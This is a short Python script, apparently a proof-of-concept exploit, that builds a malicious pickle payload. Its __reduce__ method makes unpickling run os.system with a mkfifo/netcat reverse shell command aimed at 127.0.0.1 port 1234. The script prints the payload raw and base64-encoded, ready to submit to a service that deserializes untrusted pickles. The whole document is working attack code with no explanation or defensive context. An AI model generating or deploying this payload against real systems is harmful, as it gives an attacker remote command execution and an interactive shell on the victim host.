import pickle
import base64
import os

class Pwn:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(Pwn())
    print('Raw : ', pickled)
    print('Base64 : ', base64.b64encode(pickled))
    